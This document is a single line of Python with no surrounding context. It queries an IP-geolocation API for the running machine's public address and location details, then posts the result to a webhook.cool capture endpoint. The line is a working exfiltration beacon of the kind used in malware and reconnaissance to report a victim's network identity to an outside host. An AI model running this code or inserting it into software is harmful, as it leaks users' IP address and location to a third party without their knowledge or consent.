import requests;from json import dumps;i=requests.get("https://api.ipapi.is").json();requests.post("https://plump-orange-57.webhook.cool", dumps(i))
